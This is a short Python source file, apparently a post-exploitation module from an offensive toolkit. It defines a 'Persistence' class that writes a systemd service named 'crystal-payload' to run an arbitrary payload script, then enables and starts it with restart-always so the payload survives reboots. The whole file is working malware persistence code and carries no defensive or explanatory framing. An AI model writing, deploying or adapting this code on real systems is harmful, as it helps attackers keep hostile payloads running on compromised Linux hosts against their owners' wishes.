import os

class Persistence:
    def __init__(self, payload_path):
        self.payload_path = payload_path

    def run(self):
        service_name = "crystal-payload"
        service_file_path = f"/etc/systemd/system/{service_name}.service"
        service_content = f"""
[Unit]
Description=Crystal Payload
After=network.target

[Service]
ExecStart=/usr/bin/python3 {self.payload_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
        try:
            with open(service_file_path, "w") as f:
                f.write(service_content)
            os.system(f"systemctl daemon-reload")
            os.system(f"systemctl enable {service_name}")
            os.system(f"systemctl start {service_name}")
            return f"Persistence established with systemd service: {service_name}"
        except Exception as e:
            return f"Failed to establish persistence: {e}"
